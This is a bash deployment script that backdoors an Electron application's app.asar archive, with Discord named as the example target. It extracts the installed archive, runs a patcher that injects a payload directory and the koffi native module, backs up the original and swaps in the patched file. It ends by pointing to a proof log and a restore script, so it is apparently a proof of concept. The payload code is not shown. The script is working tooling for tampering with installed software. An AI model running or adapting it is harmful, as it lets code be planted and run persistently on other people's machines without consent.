#!/usr/bin/env bash
# deploy.sh — backdoor the app.asar at the given path (reversible).
#
# Usage: ./deploy.sh APP_ASAR|GLOB ...
#   APP_ASAR: full path to the app.asar to backdoor, e.g.
#     /mnt/c/Users/*/AppData/Local/Discord/app-*/resources/app.asar
#   The glob may be shell-expanded or quoted (expanded here); several matches
#   -> the newest by version sort is used.
#
# Rebuilds the patched archive from the *target's own* app.asar on every run so
# a stale output/ artifact can never ship. Quit the target app before running.
set -euo pipefail

cd "$(dirname "$0")"

# --- resolve the target app.asar (single file; newest of any matches) ---
asars=()
for arg in "$@"; do
  if [ -f "$arg" ]; then
    asars+=("$arg")
  else
    hit=0
    while IFS= read -r m; do asars+=("$m"); hit=1; done < <(compgen -G "$arg" || true)
    [ "$hit" -eq 0 ] && echo "note     : no match for '$arg'" >&2
  fi
done
if [ "${#asars[@]}" -eq 0 ]; then
  echo "usage: $0 APP_ASAR|GLOB   (full path to the .asar to backdoor)" >&2
  exit 1
fi

ASAR=$(printf '%s\n' "${asars[@]}" | sort -V | tail -1)
[ "${#asars[@]}" -gt 1 ] && echo "note     : ${#asars[@]} matches; using newest"
TARGET=$(dirname "$ASAR")

echo "target   : $ASAR"

# Rebuild from the target's own archive: extract -> patch (payload/ + koffi) -> repack.
CLEAN=$(mktemp -d)
trap 'rm -rf "$CLEAN"' EXIT
node -e 'require("@electron/asar").extractAll(process.argv[1], process.argv[2])' "$ASAR" "$CLEAN"
node tools/patch.js "$CLEAN" "$ASAR" output/app.asar.patched
PATCHED="output/app.asar.patched"
UNPACKED="$PATCHED.unpacked"

echo "installed: $(sha256sum "$ASAR" | cut -c1-16)…"
echo "patched  : $(sha256sum "$PATCHED" | cut -c1-16)…"

# one-time backup of the pristine archive
if [ ! -f "$ASAR.orig.bak" ]; then
  cp "$ASAR" "$ASAR.orig.bak"
  echo "backup   : created $(basename "$ASAR").orig.bak"
else
  echo "backup   : $(basename "$ASAR").orig.bak already exists (kept)"
fi

cp "$PATCHED" "$ASAR"
echo "deployed : app.asar replaced (sha256 $(sha256sum "$ASAR" | cut -c1-16)…)"

# Packed-mode builds have no .unpacked directory; Electron extracts the .node
# from app.asar to %TEMP% on first require. Unpacked-mode builds merge here.
if [ -d "$UNPACKED" ]; then
  mkdir -p "$ASAR.unpacked"
  cp -a "$UNPACKED/." "$ASAR.unpacked/"
  echo "deployed : $(basename "$ASAR").unpacked merged (koffi native module)"
else
  rm -rf "$ASAR.unpacked/node_modules/@koromix"
  echo "deployed : single-file mode (native module packed in $(basename "$ASAR"))"
fi
echo
echo "1. launch the target app normally"
echo "2. proof : cat /mnt/c/Users/*/AppData/Local/Temp/asar_poc_proof.log"
echo "3. undo  : ./restore.sh \"$TARGET\""
